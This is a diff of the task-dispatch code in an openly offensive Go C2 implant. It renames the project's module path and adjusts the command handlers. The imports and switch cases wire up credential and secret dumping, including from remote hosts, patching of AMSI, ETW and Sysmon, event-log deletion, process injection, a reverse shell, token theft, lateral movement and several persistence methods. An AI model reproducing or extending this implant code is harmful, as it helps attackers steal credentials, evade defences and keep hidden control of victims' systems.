@@ -16,43 +16,43 @@ import (
 	"time"
 
 	"github.com/gorilla/websocket"
-	"github.com/latortuga71/wsC2/internal/data"
-	"github.com/latortuga71/wsC2/internal/modules/basic"
-	"github.com/latortuga71/wsC2/internal/modules/credentials/dumpprocess"
-	"github.com/latortuga71/wsC2/internal/modules/credentials/dumpsecrets"
-	"github.com/latortuga71/wsC2/internal/modules/enumeration/enumlocaluser"
-	"github.com/latortuga71/wsC2/internal/modules/enumeration/env"
-	"github.com/latortuga71/wsC2/internal/modules/enumeration/ifconfig"
-	"github.com/latortuga71/wsC2/internal/modules/enumeration/listports"
-	"github.com/latortuga71/wsC2/internal/modules/enumeration/listservices"
-	"github.com/latortuga71/wsC2/internal/modules/enumeration/listshares"
-	"github.com/latortuga71/wsC2/internal/modules/enumeration/screenshot"
-	"github.com/latortuga71/wsC2/internal/modules/evasion/cleareventlog"
-	"github.com/latortuga71/wsC2/internal/modules/evasion/patchamsi"
-	"github.com/latortuga71/wsC2/internal/modules/evasion/patchetw"
-	"github.com/latortuga71/wsC2/internal/modules/evasion/patchsysmon"
-	"github.com/latortuga71/wsC2/internal/modules/evasion/unhookntdll"
-	"github.com/latortuga71/wsC2/internal/modules/execution/createprocess"
-	"github.com/latortuga71/wsC2/internal/modules/execution/processinjection"
-	"github.com/latortuga71/wsC2/internal/modules/execution/reverseshell"
-	"github.com/latortuga71/wsC2/internal/modules/execution/runbinary"
-	"github.com/latortuga71/wsC2/internal/modules/impersonation/enableprivilege"
-	"github.com/latortuga71/wsC2/internal/modules/impersonation/enumtokens"
-	"github.com/latortuga71/wsC2/internal/modules/impersonation/getsystem"
-	"github.com/latortuga71/wsC2/internal/modules/impersonation/rev2self"
-	"github.com/latortuga71/wsC2/internal/modules/impersonation/stealtoken"
-	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/admincheck"
-	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/exectools"
-	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/portforward"
-	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/scanner"
-	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/scheduledtasks"
-	"github.com/latortuga71/wsC2/internal/modules/lateralmovement/services"
-	"github.com/latortuga71/wsC2/internal/modules/persistence/logonscript"
-	"github.com/latortuga71/wsC2/internal/modules/persistence/powershellprofile"
-	"github.com/latortuga71/wsC2/internal/modules/persistence/runkey"
-	"github.com/latortuga71/wsC2/internal/modules/privilegeescalation/goup"
-	"github.com/latortuga71/wsC2/internal/modules/privilegeescalation/shellhistory"
-	"github.com/latortuga71/wsC2/internal/utils"
+	"github.com/latortuga71/GoC2/internal/data"
+	"github.com/latortuga71/GoC2/internal/modules/basic"
+	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpprocess"
+	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpsecrets"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlocaluser"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/env"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/ifconfig"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/listports"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/listservices"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/listshares"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/screenshot"
+	"github.com/latortuga71/GoC2/internal/modules/evasion/cleareventlog"
+	"github.com/latortuga71/GoC2/internal/modules/evasion/patchamsi"
+	"github.com/latortuga71/GoC2/internal/modules/evasion/patchetw"
+	"github.com/latortuga71/GoC2/internal/modules/evasion/patchsysmon"
+	"github.com/latortuga71/GoC2/internal/modules/evasion/unhookntdll"
+	"github.com/latortuga71/GoC2/internal/modules/execution/createprocess"
+	"github.com/latortuga71/GoC2/internal/modules/execution/processinjection"
+	"github.com/latortuga71/GoC2/internal/modules/execution/reverseshell"
+	"github.com/latortuga71/GoC2/internal/modules/execution/runbinary"
+	"github.com/latortuga71/GoC2/internal/modules/impersonation/enableprivilege"
+	"github.com/latortuga71/GoC2/internal/modules/impersonation/enumtokens"
+	"github.com/latortuga71/GoC2/internal/modules/impersonation/getsystem"
+	"github.com/latortuga71/GoC2/internal/modules/impersonation/rev2self"
+	"github.com/latortuga71/GoC2/internal/modules/impersonation/stealtoken"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/admincheck"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/exectools"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/portforward"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scanner"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/scheduledtasks"
+	"github.com/latortuga71/GoC2/internal/modules/lateralmovement/services"
+	"github.com/latortuga71/GoC2/internal/modules/persistence/logonscript"
+	"github.com/latortuga71/GoC2/internal/modules/persistence/powershellprofile"
+	"github.com/latortuga71/GoC2/internal/modules/persistence/runkey"
+	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/goup"
+	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/shellhistory"
+	"github.com/latortuga71/GoC2/internal/utils"
 )
 
 var CheckedInChan chan interface{}
@@ -208,10 +208,10 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = portforward.RevertPortForward()
 	case "dump-process":
 		result, cmdError = dumpprocess.MiniDumpProcess(t.Args)
-	case "dump-hashes":
-		result, cmdError = dumpsecrets.DumpHashes()
-	case "dump-lsa":
-		result, cmdError = dumpsecrets.DumpLsaSecrets()
+	case "dump-secrets":
+		result, cmdError = dumpsecrets.DumpSecrets()
+	case "dump-secrets-remote":
+		result, cmdError = dumpsecrets.DumpSecretsRemote(t.Args)
 	case "enum-users":
 		result, cmdError = enumlocaluser.EnumUsers()
 	case "enum-groups":
@@ -234,6 +234,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = listports.ListPorts()
 	case "delete-event-log":
 		result, cmdError = cleareventlog.DeleteEventLog(t.Args[0])
+	case "scheduled-task":
+		result, cmdError = scheduledtasks.CreateScheduledTask(t.Args)
 	case "create-scheduled-task":
 		result, cmdError = scheduledtasks.CreateScheduledTask(t.Args)
 	case "execute-scheduled-task":
@@ -243,7 +245,7 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "powershell-profile":
 		result, cmdError = powershellprofile.PowershellProfilePersistence(t.Args[0])
 	case "port-scan":
-		result, cmdError = scanner.PortScan(t.Args[0])
+		result, cmdError = scanner.SinglePortScan(t.Args)
 	case "subnet-scan":
 		result, cmdError = scanner.SubnetScan(t.Args[0])
 	case "wmi-exec":
